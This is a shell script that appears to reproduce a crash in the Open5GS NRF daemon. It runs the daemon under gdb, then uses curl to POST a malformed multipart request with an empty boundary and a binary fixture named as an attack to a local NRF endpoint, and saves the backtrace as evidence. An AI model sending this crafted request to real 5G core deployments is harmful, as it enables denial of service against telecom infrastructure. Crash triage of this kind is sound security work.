#!/bin/sh
# Capture a backtrace for the real NRF SIGABRT on the attack body.
set -u
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
P=$HERE/../local-prefix
BIN=${NRF_BIN:-$HERE/../build/bld/src/nrf/open5gs-nrfd}
LOG=$HERE/evidence
export LD_LIBRARY_PATH="$P/usr/lib/x86_64-linux-gnu"
mkdir -p "$LOG"
command -v gdb > /dev/null || { echo 'NO GDB'; exit 2; }

gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'handle SIGPIPE nostop noprint pass' \
    -ex run -ex 'bt 25' -ex 'info registers rip' \
    --args "$BIN" -c "$HERE/nrf.yaml" > "$LOG/gdbattack.out" 2>&1 &
gpid=$!
i=0
while [ "$i" -lt 100 ]; do
    if ss -ltn 2>/dev/null | grep -q ':18777'; then break; fi
    sleep 0.1
    i=$((i + 1))
done
curl -sS --http2-prior-knowledge -o "$LOG/gdbattack.response" \
    -w 'code=%{http_code} proto=%{http_version}\n' \
    --max-time 10 -H 'Content-Type: multipart/related; boundary=""' \
    --data-binary "@$HERE/fixtures/attack-396.bin" \
    http://127.0.0.1:18777/nnrf-nfm/v1/nf-instances > "$LOG/gdbattack.curl" 2>&1 || true
wait "$gpid" || true
echo "CURL: $(cat "$LOG/gdbattack.curl")"
echo ===GDB===
tail -60 "$LOG/gdbattack.out"
